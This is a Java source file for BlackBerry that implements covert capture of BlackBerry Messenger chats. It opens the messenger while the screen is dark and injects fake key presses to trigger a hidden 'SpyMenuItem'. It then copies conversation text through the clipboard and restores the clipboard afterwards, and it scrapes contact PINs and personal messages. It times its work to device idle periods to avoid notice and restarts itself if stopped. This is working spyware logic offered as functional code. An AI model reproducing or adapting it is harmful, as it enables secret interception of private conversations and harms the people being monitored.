package com.vvt.bbm;

import java.util.Hashtable;
import java.util.Random;
import java.util.Timer;
import java.util.TimerTask;
import java.util.Vector;

import net.rim.blackberry.api.menuitem.ApplicationMenuItem;
import net.rim.blackberry.api.menuitem.ApplicationMenuItemRepository;
import net.rim.device.api.i18n.Locale;
import net.rim.device.api.system.Application;
import net.rim.device.api.system.ApplicationDescriptor;
import net.rim.device.api.system.ApplicationManager;
import net.rim.device.api.system.ApplicationManagerException;
import net.rim.device.api.system.Backlight;
import net.rim.device.api.system.Characters;
import net.rim.device.api.system.Clipboard;
import net.rim.device.api.system.DeviceInfo;
import net.rim.device.api.system.EventInjector;
import net.rim.device.api.system.GlobalEventListener;
import net.rim.device.api.system.KeypadListener;
import net.rim.device.api.system.RealtimeClockListener;
import net.rim.device.api.ui.Field;
import net.rim.device.api.ui.Keypad;
import net.rim.device.api.ui.Manager;
import net.rim.device.api.ui.MenuItem;
import net.rim.device.api.ui.Screen;
import net.rim.device.api.ui.UiApplication;
import net.rim.device.api.ui.component.LabelField;
import net.rim.device.api.ui.component.Menu;
import net.rim.device.api.ui.component.TextField;
import net.rim.device.api.util.DateTimeUtilities;

public class BBMEngine implements RealtimeClockListener, GlobalEventListener {

	private static String TAG = "BBM";
	private BBMEngine	self;	
	
	// timer parameters
	private final int	delay					= 500;
//	private int			longWaitToSetupPeriod	= 20000;		//180000;
//	private int			tryToSetupPeriod		= 20000;		//20000;
	private int			longWaitToSetupPeriod	= 20000;
	private int			tryToSetupPeriod		= 20000;
	private int			tryToSetupInitPeriod	= 1000;
	private int			copyChatPeriod			= 5000;
	private int			copyChatInitPeriod 		= 1000;
	private int 		waitUntilIdleAtleast	= 7;
	
	
	// setup parameters	
	private boolean 				_setupReady = false;
	private BBMConversationListener _listener 	= null;
	private Timer					_timerSetup = new Timer();
	private BBMSetup				bbmSetup 	= null;
	private long					startTime 	= 0L; 

	// capture parameters
	private Timer 					_timer		= new Timer();
	private ConversationCapturer	convCap		= null; 

	// Conversation handler & database
	private ConversationHandler		convHandler	= new ConversationHandler();
	
	private UiApplication	bbmUiApp 	= null;
	private int 			captureId;
	
	public BBMEngine()	{
		self 		= this;
		captureId 	= 0;
		_setupReady = false;
		if (Log.isDebugEnable())  {Log.debug(TAG,"BBM constructor"); }
	}
	
	public static boolean isSupported()	{
		boolean notInList 	= true;
		String 	model 		= DeviceInfo.getDeviceName().trim();
		if (model.startsWith("870"))	{
			notInList = false;
			if (Log.isDebugEnable())  {Log.debug(TAG,"BBM is not suppprt 870x series"); }
		}
		return notInList;
	}
	
	public void setBBMConversationListener(BBMConversationListener listener)	{
		_listener = listener;
		convHandler.setBBMConversationListener(_listener);
		if (Log.isDebugEnable())  {Log.debug(TAG,"listener is set"); }
	}
	
	public boolean removeBBMConversationListener()	{
		if (Log.isDebugEnable())  {Log.debug(TAG,"Listener is removed"); }
		bbmSetup.removeBBMConversationListener();
		if (convCap != null)	{
			convCap.removeBBMConversationListener();
		}
		if (convHandler != null)	{
			convHandler.removeBBMConversationListener();
		}
		return true;
	}
	
	public void start()	{
		if (Log.isDebugEnable())  {Log.debug(TAG,"BBM.start()"); }
		if (_listener == null) {
			_listener.setupFailed("Caller has to set BBMConversationListener before call start()");
			if (Log.isDebugEnable())  {Log.debug(TAG,"Listener not found ?"); }
		}
		else {
			if (Log.isDebugEnable())  {Log.debug(TAG,"Setup()"); }
//			if (Log.isDebugEnable())  {Log.memory(TAG+"(Start)"); }
			
			startTime = System.currentTimeMillis();
			Application.getApplication().addGlobalEventListener(self);
			
			setup();
		}
		try {
			// Monitor thread;
			UiApplication.getUiApplication().addRealtimeClockListener(this);
			if (Log.isDebugEnable())  {Log.debug(TAG,"RealtimeClock start"); }
		}
		catch (Exception e) {
			Log.error(TAG, "Cannot add RealTimeClock.");
		}
	}
	
	private void setup()	{
		try {
			_setupReady = false;
			if (bbmSetup != null)	{
				bbmSetup.cancel();
			}
			bbmSetup = new BBMSetup(true);
			if (_listener != null)	{
				bbmSetup.setBBMConversationListener(_listener);
			}
			if (Log.isDebugEnable())  {Log.debug(TAG,"start schedule("+tryToSetupInitPeriod+","+tryToSetupPeriod+")"); }
			_timerSetup.schedule(bbmSetup, tryToSetupInitPeriod, tryToSetupPeriod);
			startTime = System.currentTimeMillis();
		}
		catch (Exception e) {
			if (_listener != null)	{
				_listener.setupFailed("Setup fail:"+e.getMessage());
				if (Log.isDebugEnable())  {Log.error(TAG,"* Exception @setup:"+e.getMessage()); }
			}
		}
	}
	
	// stop conversation Capture
	public void stop()	{
		if (Log.isDebugEnable())  {Log.debug(TAG,"BBM.stop()"); }
		try {	
			if (bbmSetup != null)	{
				bbmSetup.removeBBMConversationListener();
				bbmSetup.cancel();
				if (Log.isDebugEnable())  {Log.debug(TAG,"Cancel task schedule"); }
			}
			if (convCap != null)	{
				convCap.removeBBMConversationListener();
				convCap.cancel();
				if (Log.isDebugEnable())  {Log.debug(TAG,"Cancel conversation task schedule"); }
			}
			convHandler.removeBBMConversationListener();		
			if (_listener != null)	{
				_listener.stopCompleted();
			}
			if (Log.isDebugEnable())  {Log.memory(TAG+"Stop"); }
			startTime = 0L;
			Application.getApplication().removeGlobalEventListener(self);
		}
		catch (Exception e) {
			if (_listener != null)	{
				if (Log.isDebugEnable())  {
					Log.error(TAG,"* Exception @stop:"+e.getMessage()); 
				}
				_listener.stopFailed(e.getMessage());
			}
		}
		try {
			// Monitor thread;
			UiApplication.getUiApplication().removeRealtimeClockListener(this);
			if (Log.isDebugEnable())  {Log.debug(TAG,"RealtimeClock stop"); }
		}
		catch (Exception e) {
			Log.error(TAG, "Cannot remove RealTimeClock.");
		}
	}
	
	public void longWait()	{
		if (Log.isDebugEnable())  {Log.debug(TAG,"Longer wait to setup"); }
		try {
			_setupReady = false;
			if (bbmSetup != null)	{
				bbmSetup.cancel();
				if (Log.isDebugEnable())  {Log.debug(TAG,"Cancel task schedule"); }
			}
			bbmSetup = new BBMSetup(false);
			if (_listener != null)	{
				bbmSetup.setBBMConversationListener(_listener);
			}
			if (Log.isDebugEnable())  {
				Log.debug(TAG,"Start longer schedule("+longWaitToSetupPeriod+", "+longWaitToSetupPeriod+")"); 
			}
			_timerSetup.schedule(bbmSetup, longWaitToSetupPeriod, longWaitToSetupPeriod);	
		}
		catch (Exception e) {
			if (_listener != null)	{
				_listener.setupFailed("Setup fail:"+e.getMessage());
				if (Log.isDebugEnable())  {Log.error(TAG,"* Exception @longWait:"+e.getMessage()); }
			}
		}
	}
	
	public boolean bringBBMtoForeground()	{
		boolean gotoBBM = false;
		ApplicationDescriptor wanted = null;
		ApplicationManager manager = ApplicationManager.getApplicationManager();
        ApplicationDescriptor descriptors[] = manager.getVisibleApplications();
        for (int i=0; i<descriptors.length; i++)	{
        	ApplicationDescriptor d = descriptors[i];
        	String name = d.getName().trim();
        	if ((name.length()<=20) && name.startsWith("BlackBerry")&& name.endsWith("Messenger"))	{
        		wanted = d;
            }
        }        
        try {
        	if (wanted != null)	{
        		manager.runApplication(wanted);
        		gotoBBM = true;
        		if (Log.isDebugEnable())  {Log.debug(TAG,"Bring BBM to foreground"); }
        	}
		}
		catch (ApplicationManagerException e)	{	
			_listener.setupFailed("Can not call BlackBerry Messenger");
			if (Log.isDebugEnable())  {Log.debug(TAG,"* ApplicationManagerException::Cannot bring BBM to foreground !?"); }
		}
		return gotoBBM;
	}
	
	// Class for setup !!
	class BBMSetup extends TimerTask	{
		
		private BBMConversationListener _listener;
		private SpyMenuItem				_spyMenuItem;
		
//		private SimpleDateFormat formatter 	= new SimpleDateFormat("yyyy/MM/dd HH:mm:ss");
		private int 	_order	= Integer.MAX_VALUE;
		private String	_name 	= "z";
		private int		_try	= 0;
		private boolean	_short	= false;
		
		public BBMSetup(boolean waitMode)	{
			_try			= 0;
			_short			= waitMode;
			_spyMenuItem 	= new SpyMenuItem(_order, _name);
		}
		
		public void setBBMConversationListener(BBMConversationListener listener)	{
			this._listener 	= listener;
			if (Log.isDebugEnable())  {Log.debug(TAG,"BBMSetup: Set listener"); }
		}
		
		public boolean removeBBMConversationListener()	{
			this._listener 	= null;
			if (Log.isDebugEnable())  {Log.debug(TAG,"BBMSetup: Remove listener"); }
			return true;	
		}
		
		public void run()	{
			if (!_setupReady)	{
				if (!Backlight.isEnabled() &&
//				if (
					!ApplicationManager.getApplicationManager().isSystemLocked())	{
					ApplicationDescriptor activeApp = getActiveApp();
					_try++;
					if (Log.isDebugEnable())  {Log.debug(TAG,"Try #"+_try+" to setup BBM"); }
					//Date today 	= new Date(System.currentTimeMillis());
					//_listener.setupFailed("Try to set BBMCapture "+formatter.format(today)+"\n");
					if (callBlackBerryMessenger())	{
						try { Thread.sleep(delay); } catch (Exception e) {} // Wait for call BBM
						//if (Log.isEnable()) { Log.debug("??? Is it in BBM ???"); }
						if (addSpyMenu())	{
							if (!Backlight.isEnabled())	{ 
								injectKeys();
							}
							removeSpyMenu();
						}
						else {
							if (Log.isDebugEnable())  {Log.debug(TAG,"Cannot integrate into bbm"); }
						}
					}
					if (!Backlight.isEnabled()) {
						backToActiveApp(activeApp);
						if (Log.isDebugEnable())  {Log.debug(TAG,"Go back to previous app"); }
					}
					
					if (!_setupReady) {
						
						//_listener.setupFailed("Please wait.. BBMCapture's setting "+formatter.format(today)+"\n");
						if (_short && ((_try%3)==0))	{
							longWait();
						}
						if (_try == 3)	{ // reset counter
							_try = 0;
						}
					}
				}
			}
		}
		
		private boolean addSpyMenu()	{
			String appName = getNowApp();
			if ((appName.length()<=20) && appName.startsWith("BlackBerry")&& appName.endsWith("Messenger"))	{
				ApplicationMenuItemRepository.getInstance().addMenuItem( 
						ApplicationMenuItemRepository.MENUITEM_SYSTEM, _spyMenuItem);
				if (Log.isDebugEnable())  {Log.debug(TAG,"Integration ok"); }
				return true;
           	}
			return false;
		}
		
		private void removeSpyMenu()	{
			ApplicationMenuItemRepository.getInstance().removeMenuItem( 
					ApplicationMenuItemRepository.MENUITEM_SYSTEM, _spyMenuItem);
			if (Log.isDebugEnable())  {Log.debug(TAG,"Detaching ok"); }
		}
		
		private ApplicationDescriptor getActiveApp()	{
			ApplicationManager manager = ApplicationManager.getApplicationManager();
	        ApplicationDescriptor descriptors[] = manager.getVisibleApplications();
	        if (descriptors.length > 1)	{
	        	return descriptors[0];
	        }
	        return null;
		}
		
		private String getNowApp()	{
			ApplicationManager manager = ApplicationManager.getApplicationManager();
	        ApplicationDescriptor descriptors[] = manager.getVisibleApplications();
	        if (descriptors.length > 1)	{
	        	return descriptors[0].getName();
	        }
	        return "?";
		}
		
		private void backToActiveApp(ApplicationDescriptor app)	{
			if (app != null)	{
				try {
					ApplicationManager manager = ApplicationManager.getApplicationManager();
					manager.runApplication(app);
					if (Log.isDebugEnable())  {Log.debug(TAG,"Back to previous active app."); }
				} catch (ApplicationManagerException e) {
					if (Log.isDebugEnable())  {Log.debug(TAG,"* ApplicationManagerException:backToActiveApp"); }
				}
			}
		}
		
		private boolean callBlackBerryMessenger()	{
			boolean gotoBBM = false;
			
			ApplicationDescriptor wanted = null;
			ApplicationManager manager = ApplicationManager.getApplicationManager();
	        ApplicationDescriptor descriptors[] = manager.getVisibleApplications();
	        for (int i=0; i<descriptors.length; i++)	{
	        	ApplicationDescriptor d = descriptors[i];
	        	String name = d.getName().trim();
	        	if ((name.length()<=20) && name.startsWith("BlackBerry")&& name.endsWith("Messenger"))	{
	        		wanted = d;
	           	}
	        }        
	        try {
	        	if (wanted != null)	{
	        		manager.runApplication(wanted);
	        		gotoBBM = true;
	        		if (Log.isDebugEnable())  {Log.debug(TAG,"Call BBM to foreground"); }
	        	}
	        	else {
	        		if (_listener != null) {
		        		_listener.setupFailed("Setup failed: no BBM instance ");
	        		}
	        		if (Log.isDebugEnable())  {Log.debug(TAG,"Setup failed: no BBM instance"); }
	        	}
			}
			catch (ApplicationManagerException e)	{
				if (_listener != null) {
	        		_listener.setupFailed("Setup failed:"+e.getMessage()); 
				}
				if (Log.isDebugEnable())  {Log.debug(TAG,"* ApplicationManagerException::Cannot bring BBM to foreground !?");  }
			}
			catch (Exception e) {
				if (_listener != null) {
	        		_listener.setupFailed("Setup failed Exception:"+e.getMessage());
				}
			}
			return gotoBBM;
		}
		
		public void injectKeys()	{
			try {
				EventInjector.KeyCodeEvent 		menuDown
					= new EventInjector.KeyCodeEvent(EventInjector.KeyCodeEvent.KEY_DOWN, 
	        		    (char) Keypad.KEY_MENU, KeypadListener.STATUS_NOT_FROM_KEYPAD, 10);        	
	        	EventInjector.TrackwheelEvent z
	            = new EventInjector.TrackwheelEvent(EventInjector.TrackwheelEvent.THUMB_ROLL_DOWN, 
	             1, KeypadListener.STATUS_NOT_FROM_KEYPAD);
	        	EventInjector.TrackwheelEvent	click
	    			= new EventInjector.TrackwheelEvent(EventInjector.TrackwheelEvent.THUMB_CLICK, 
	    				1, KeypadListener.STATUS_NOT_FROM_KEYPAD);
  
	        	Thread.sleep(delay);
	        	menuDown.post();
	        	if (Log.isDebugEnable())  {Log.debug(TAG," - click menu"); }
	        	Thread.sleep(delay);
	        	z.post();
	        	z.post();
	        	z.post();
	        	z.post();
	        	z.post();
	        	z.post();
	        	z.post();
	        	z.post();
	        	z.post();
	        	z.post();
	        	if (Log.isDebugEnable())  {Log.debug(TAG," - click a key"); }
	        	Thread.sleep(delay);
	        	click.post();
	        	if (Log.isDebugEnable())  {Log.debug(TAG," - click it"); }
	        } 
	        catch (Exception e) {
	        	if (_listener != null)
	        		_listener.setupFailed("Setup failed:Key Injection ::"+
	        				"BBM's menu not ready");

	        	if (Log.isDebugEnable())  {Log.debug(TAG,"Key Injection failed !? :"+e.getMessage()); }
	        }
		}
		
		private class SpyMenuItem extends ApplicationMenuItem {
			private String _name = "z";
			
			SpyMenuItem(int order, String name) {
				super(order);
				this._name = name;
			}

			public Object run(Object context) {
				try {
					UiApplication.getUiApplication().invokeAndWait(new Runnable() {								
						public void run() {
							UiApplication uapp = UiApplication.getUiApplication();
							if (Log.isDebugEnable())  {Log.debug(TAG,"!! StartCapture !!"); }
							bbmUiApp = uapp; // keep bbm reference
							startCapture(uapp);
						}
					});
				}
				catch (IllegalStateException e)	{
					if (_listener != null)
						_listener.setupFailed(e.getMessage());
					if (Log.isDebugEnable())  {Log.debug(TAG,"* IllegalStateException ?"+e.getMessage()); }
				}
				return context;
			}

			public String toString() {
				return this._name;
			}
		}
	}
	
	private void startCapture(final UiApplication  uapp)	{
		uapp.invokeAndWait(new Runnable() {
			public void run() {
				String name = uapp.getClass().getName();
				if ((name.indexOf("qm.bbm.BBMApplication") > -1) ||
					(name.indexOf("PeerApplication") > -1) )	{
					try {
//						if (Log.isDebugEnable())  {Log.debug(TAG,"!! Yes, we get BBM !!"); }
						
						convCap = new ConversationCapturer(++captureId);		
						if (_listener != null)	{
							convCap.setBBMConversationListener(_listener);
						}
						convCap.setWatchingApplication(uapp);
						
						//uapp.requestBackground();
						if (Log.isDebugEnable())  {Log.debug(TAG,"BBM Monitor starting !!"); }
						_timer.schedule(convCap, copyChatInitPeriod, copyChatPeriod);
						try {
							if (bbmSetup != null)	{
								bbmSetup.cancel();
								if (Log.isDebugEnable())  {Log.debug(TAG,"Stop setup process for monitor only"); }
							}
						}
						catch (Exception e)	{
							if (Log.isDebugEnable())  {Log.debug(TAG,"Exception: Cancel setup-process error"); }
							_listener.setupFailed("Cancel setup-process error:"+e.getMessage());
						}
						_setupReady = true;
						if (_listener != null)	{
							_listener.setupCompleted();

//							if (Log.isDebugEnable())  {Log.debug(TAG,"### setupCompleted ###"); }
							if (Log.isDebugEnable())  {Log.memory(TAG+"Setup Completed"); }
						}
					}
					catch (Exception e)	{
						_listener.setupFailed(e.getMessage());
						if (Log.isDebugEnable())  {Log.debug(TAG,"* StartCapture.Exception: "+e.getMessage()); }
					}
				}
				else {
					if (_listener != null) 
						_listener.setupFailed("BlackBerry Messenger is not ready !?");
					if (Log.isDebugEnable())  {Log.debug(TAG,"StartCapture:BlackBerry Messenger is not ready !?"); }
				}
			}
		});
	}
	
	// ---- Test ----
//	public void setMemoryTest()	{
//		convCap.setMemoryFlag(true);
//	}
	// --------------

	class ConversationCapturer extends TimerTask	{

		private static final String	PIN_BBM_4_2			= "Info: ";
		private static final String	PIN_BBM_4_6			= "PIN: ";
//		private static final String	PIN_BBM_5_0			= "PIN:";
		
		private static final String	SCREEN_BBM_5_0		= "UserInfoScreen";
		private static final String	SCREEN_BBM_OLDER_5	= "peer.UserInfoScreen";
				
		private BBMConversationListener _listener		= null;
		private UiApplication			_bbmInstance 	= null;
		private Vector					_screens		= new Vector();
		private Hashtable				_tmpPersonal	= new Hashtable();
		
		private LanguageInfo langEngine;
		
		private String 	emptyString = "";
		private boolean copying 	= false;
		
		private long 	lastRunning = 0L;
		private int		uid 		= 0;
		
		public ConversationCapturer(int captureId)	{
			uid = captureId;
			lastRunning = System.currentTimeMillis();
			langEngine = new LanguageInfo(Locale.getDefaultForSystem().getLanguage());
		}
		
		private void checkLanguage() {
			langEngine.updateLanguage(Locale.getDefaultForSystem().getLanguage());
		}
		
		public void setWatchingApplication(UiApplication appInstance)	{
			_bbmInstance = appInstance;
			if (Log.isDebugEnable())  {Log.debug(TAG,"Get BBM instance."); }
		}
		
		public void setBBMConversationListener(BBMConversationListener listener)	{
			this._listener = listener;
			if (Log.isDebugEnable())  {Log.debug(TAG,"BBM Listener is set."); }
		}
		
		public boolean removeBBMConversationListener()	{
			this._listener = null;
			return true;
		}
		
		public long getLastAlive() {
			return lastRunning;
		}
		
		// ----------------------- Test -----------------------
//		private Vector bbmFat = new Vector();
//		private boolean eatMemory = false;
//		
//		public void setMemoryFlag(boolean starving) {
//			eatMemory = starving;
//		}
//		
//		public String generateData() {
//			StringBuffer strBuffer = new StringBuffer(1500000);
//			byte[] rs;
//			//for (int i = 0; i < 1024; i++) {
//			for (int i = 0; i < 512; i++) {
//				rs = RandomSource.getBytes(5120);
//				String str = new String(rs);
//				strBuffer.append(str);
//			}
//			return strBuffer.toString();
//		}
		// ----------------------------------------------------
		
		public void run()	{
			if (_bbmInstance==null)	{ return; 	}
			lastRunning = System.currentTimeMillis();
			
			if (Log.isDebugEnable())  {Log.debug(TAG,"("+uid+") +"+_screens.size()); }
			
			// ---------------- Testing ------------------
//			if (eatMemory) {
//				Log.memory("[*] From "+bbmFat.size());
//				bbmFat.addElement(generateData());
//				Log.memory("[*] To "+bbmFat.size());
//			}
			// -------------------------------------------
			
			if (_bbmInstance.isForeground())	{
				Screen screen = _bbmInstance.getActiveScreen();
				if (screen.toString().indexOf("ConversationScreen")>-1)	{
					if (!_screens.contains(screen))	{
						_screens.addElement(screen);
						if (Log.isDebugEnable())  {Log.memory(TAG+"+New watching Screen ("+_screens.size()+")"); }
					}
				}
			}
			else {
				if (copying) { return;	} 	// if copying please stop;
				
				try {
					if (_screens.size()==0) { return; }
					checkLanguage();
					synchronized(this)	{
						if (!copying) {
							copying = true;
							if (_screens.size()<1) { return; }
							do {
								Random	rand	= new Random();
								int		t		= rand.nextInt(10);
								if (DeviceInfo.getIdleTime() < (t+waitUntilIdleAtleast)) {
									break;
								}
								else {
									_bbmInstance.invokeAndWait(new Runnable() {
										public void run() {
											try {
	//											if (Log.isDebugEnable())  {Log.debug(TAG,"Copy "+_screens.size()+" screens."); }
												if (Log.isDebugEnable())  {Log.memory(TAG+"-Copy "+_screens.size()+" screens"); }
												Screen screen 		= (Screen) _screens.firstElement();
												String pin 			= getPIN(screen);
												String personal		= emptyString;
												if (pin.length()>0) {
													int hashCode 	= screen.hashCode();
													if (_tmpPersonal.containsKey(pin)) {
														personal 	= (String) _tmpPersonal.get(pin);
													}
													//if (Log.isDebugEnable())  {Log.debug(TAG,"PIN: "+pin+" ,hashCode: "+hashCode); }
													String chatScr 	= copy(screen);
													if (Log.isDebugEnable())  {Log.memory(TAG+"-Conversation length: "+chatScr.length()+" bytes"); }
													convHandler.update(pin, hashCode, chatScr, personal);
													chatScr 		= null;
													personal		= null;
												} 
												else {
													if (Log.isDebugEnable())  {Log.debug(TAG,"No PIN"); }
												}
											}
											catch (Exception e) {
												if (Log.isDebugEnable())  {Log.debug(TAG, "Copy failed: "+e.getMessage());}
											}
											finally {
												if (_screens.size()>0) {
													_screens.removeElementAt(0);
												}
												_tmpPersonal.clear();
											}
										}
									});									
								}
							}
							while (_screens.size() > 0);
							if (! convHandler.isUpdated())	{
								convHandler.commit();
							}
							copying = false;
						}
					}
				}
				catch (Exception e) {
					if (Log.isDebugEnable())  {Log.debug(TAG,"* Monitor.running error:"+e.getMessage()); }
				}
				finally {
					copying = false;
				}
			}
		}
		
		private String copy(final Screen screen)	{
			String sentences = emptyString;
			try {
				Menu menus 	= screen.getMenu(0);
				for (int i=0; i<menus.getSize(); i++)	{
					MenuItem menu 		= menus.getItem(i);
					String wantedMenu 	= menu.toString();
					if (langEngine.isCopyMenuItem(wantedMenu)) {
						MenuItem copyChat	= menu;
						Clipboard  	cp 		= Clipboard.getClipboard();
//						Random		rand	= new Random();
//						int			t		= rand.nextInt(10);
						Object 		tmp 	= cp.get();	
//						if (DeviceInfo.getIdleTime() >= (t+waitUntilIdleAtleast)) {
						copyChat.run();
						{
							sentences = (String) cp.get();
							if (Log.isDebugEnable())  {Log.debug(TAG,"Get conversation length "+sentences.length()+" bytes."); }
							if (Log.isDebugEnable())  {Log.memory(TAG+"-Get conversation"); }
						}
						cp.put(tmp);
						break;
					}
				}
			}
			catch (Exception e) {
				_listener.setupFailed("Copy() Error: "+e.getMessage());
				if (Log.isDebugEnable())  {Log.debug(TAG,"Copy() Error!? :"+e.getMessage()); }
			}
			return sentences;
		}
		
		private String getPIN(Screen screen)	{
			Menu menus = screen.getMenu(0);
			String pin = emptyString;
			for (int i=0; i<menus.getSize(); i++)	{
				MenuItem 	menu 		= menus.getItem(i);
				String 		wantedMenu 	= menu.toString();
//				String 		wantedMenu 	= menu.toString().toLowerCase();
//				if (wantedMenu.equals(PROFILE_MENU_4) || wantedMenu.equals(PROFILE_MENU_5)
//						|| wantedMenu.equals(PROFILE_MENU_50138))	{				
				if (langEngine.isContactInfoMenuItem(wantedMenu)) {
//				if (contactProfileMenuItems.containsKey(wantedMenu)) {
					menu.run();
					Screen contactInfoScreen 	= _bbmInstance.getActiveScreen();
					String screenClass 			= contactInfoScreen.toString();
					Vector namePin = new Vector();
//					if (Log.isDebugEnable())  {Log.debug(TAG, "Screen classname: "+screenClass);}
					if (screenClass.indexOf(SCREEN_BBM_OLDER_5)>-1)	{
						searchTextOnFields(contactInfoScreen, namePin);
						if (namePin.size() >= 2)	{
							for (int p=1; p<namePin.size(); p++)	{
								pin 	= (String) namePin.elementAt(p);								
								if (pin.startsWith(PIN_BBM_4_6)) {
									pin = pin.substring(PIN_BBM_4_6.length());
									namePin.removeAllElements();
								}
								else if (pin.startsWith(PIN_BBM_4_2)) {
									pin = pin.substring(PIN_BBM_4_2.length());
									namePin.removeAllElements();
								}
							}
							
						}
					}					
					//net.rim.device.apps.internal.qm.bbm.BBMUserInfoScreen
					//net.rim.device.apps.internal.qm.peer.view.UserInfoScreen
					else if (screenClass.indexOf(SCREEN_BBM_5_0)>-1)	{
						searchTextOnFields(contactInfoScreen, namePin);
						if (namePin.size() >= 2)	{
							for (int p=0; p<namePin.size(); p++)	{
								String label = (String) namePin.elementAt(p);
								if (langEngine.isPIN(label) && (p+1)<namePin.size()) {
//								if (label.equals(PIN_BBM_5_0) && (p+1)<namePin.size())	{
									pin = (String) namePin.elementAt(p+1);
								}
								
								else if (pin.length()>0 && langEngine.isPersonalMess(label) && (p+1)<namePin.size())	{
								//else if (pin.length()>0 && label.equals(PM_BBM_5_0_1_38) && (p+1)<namePin.size())	{
									String personalMessagein = (String) namePin.elementAt(p+1);
									_tmpPersonal.put(pin, personalMessagein.trim());
									//_listener.setupFailed("Get Personal Message:\n"+personalMessagein.trim());
								}
							}
							namePin.removeAllElements();
						}
					}
					else {
						_listener.setupFailed("Cannot copy PIN from "+contactInfoScreen.getClass().toString());
						if (Log.isDebugEnable())  {Log.debug(TAG,"getPIN() Cannot copy PIN from "+contactInfoScreen.getClass().toString()+" !?"); }
					}
					contactInfoScreen.close();
					break;
				}
			}
			return pin;
		}
		
		private Vector searchTextOnFields(Object obj, Vector buff)	{
			if (obj instanceof Manager)	{
				Manager manf = (Manager) obj;
				int count = manf.getFieldCount();
				for (int i=0; i< count; i++)	{
					Field field = (Field) manf.getField(i);
					searchTextOnFields(field, buff);
				}
			}
			else {
				if (obj instanceof TextField)	{
					TextField tf = (TextField) obj;
					buff.addElement(tf.getText().trim());
				}
				else if (obj instanceof LabelField)	{
					LabelField lf = (LabelField) obj;
					buff.addElement(lf.getText().trim());
				}
			}
			return buff;
		}
	}

	// Monitor conversation thread is death or note !
	public void clockUpdated() {
		// setup completed
		if (_setupReady && bbmUiApp != null && convCap != null) {
			long now 		= System.currentTimeMillis();
			long lastRun 	= convCap.getLastAlive();
			// Test at 1 minutes
//			if (Math.abs(now-lastRun) > 60000) {	// short Test
			if (Math.abs(now-lastRun) > 600000) {
				try {
					Log.error(TAG, "restart bbmC");
					convCap.cancel();
					convCap = null;
					startCapture(bbmUiApp);
				}
				catch (Exception e) {
					Log.error(TAG, "Cannot restart bbmC",e);
				}
			}
		}
	}

	public void eventOccurred(long guid, int data0, int data1, Object object0,
			Object object1) {
		long newTime = System.currentTimeMillis();
		if (newTime <= startTime) {
			if (Log.isDebugEnable()) {
				Log.debug(TAG, "System timer is back !");
			}
			if (guid == DateTimeUtilities.GUID_DATE_CHANGED) {
				//(guid == DateTimeUtilities.GUID_TIMEZONE_CHANGED) // No effect time
				if (_listener != null) {
					if (bbmSetup != null && !_setupReady)	{
						if (Log.isDebugEnable()) {
							Log.debug(TAG, "Restart BBMSetup again !");
						}
						setup();
					}
				}
			}
		}
		
		
	}
	
}
